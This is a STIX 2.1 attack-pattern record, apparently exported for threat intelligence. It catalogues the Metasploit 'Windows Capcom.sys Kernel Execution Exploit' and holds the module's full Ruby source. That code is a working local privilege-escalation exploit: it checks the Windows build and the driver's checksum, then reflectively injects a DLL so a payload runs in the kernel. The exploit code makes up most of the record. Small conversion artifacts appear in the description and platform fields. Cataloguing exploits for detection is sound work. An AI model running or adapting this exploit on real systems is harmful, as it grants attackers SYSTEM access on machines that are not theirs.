{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--df3c2f1c-9a2a-4a38-b1d5-66b1eb7ab349",
    "created": "2024-08-14T16:50:07.214732Z",
    "modified": "2024-08-14T16:50:07.214736Z",
    "name": "Windows Capcom.sys Kernel Execution Exploit (x64 only)",
    "description": " This module abuses the Capcom.sys kernel driver's function that allows for an arbitrary function to be executed in the kernel from user land. This function purposely disables SMEP prior to invoking a function given by the caller. This has been tested on Windows 7, 8.1, 10 (x64) and Windows 11 (x64) upto build 22000.194. Note that builds after 22000.194 contain deny lists that prevent this driver from loading.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/capcom_sys_exec.rb",
            "external_id": "capcom_sys_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/TheWack0lian/status/779397840762245124"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Windows Capcom.sys Kernel Execution Exploit (x64 only)',\n          'Description' => %q{\n            This module abuses the Capcom.sys kernel driver's function that allows for an\n            arbitrary function to be executed in the kernel from user land. This function\n            purposely disables SMEP prior to invoking a function given by the caller.\n            This has been tested on Windows 7, 8.1, 10 (x64) and Windows 11 (x64) upto build 22000.194.\n            Note that builds after 22000.194 contain deny lists that prevent this driver from loading.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'TheWack0lian', # Issue discovery\n            'OJ Reeves' # exploit and msf module\n          ],\n          'Arch' => [ARCH_X64],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n          ],\n          'Payload' => {\n            'Space' => 4096,\n            'DisableNops' => true\n          },\n          'References' => [\n            ['URL', 'https://twitter.com/TheWack0lian/status/779397840762245124']\n          ],\n          'DisclosureDate' => '1999-01-01', # non-vuln exploit date\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_fs_md5\n                stdapi_sys_config_driver_list\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    return Exploit::CheckCode::Unknown unless session.platform == 'windows'\n\n    version = get_version_info\n    if version.build_number < Msf::WindowsVersion::Win7_SP0 || version.windows_server?\n      return Exploit::CheckCode::Unknown\n    end\n\n    # These versions of Windows 11 come built in with a driver block list preventing loading of capcom.sys\n    if version.build_number > Rex::Version.new('10.0.22000.194')\n      return Exploit::CheckCode::Safe('Target contains a block list which prevents the vulnerable driver from being loaded!')\n    end\n\n    if sysinfo['Architecture'] != ARCH_X64\n      return Exploit::CheckCode::Safe\n    end\n\n    # Validate that the driver has been loaded and that\n    # the version is the same as the one expected\n    client.sys.config.getdrivers.each do |d|\n      next unless d[:basename].downcase == 'capcom.sys'\n\n      expected_checksum = '73c98438ac64a68e88b7b0afd11ba140'\n      target_checksum = client.fs.file.md5(d[:filename])\n\n      if expected_checksum == Rex::Text.to_hex(target_checksum, '')\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    check_result = check\n    if check_result == Exploit::CheckCode::Safe || check_result == Exploit::CheckCode::Unknown\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64\n      if session.arch == ARCH_X86\n        fail_with(Failure::NoTarget, 'Running against WOW64 is not supported, please get an x64 session')\n      end\n\n      if target.arch.first == ARCH_X86\n        fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')\n      end\n    end\n\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'capcom_sys_exec', 'capcom_sys_exec.x64.dll'),\n      encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "1999-01-01, # non-vuln exploit date",
    "x_mitre_platforms": [
        "win'"
    ]
}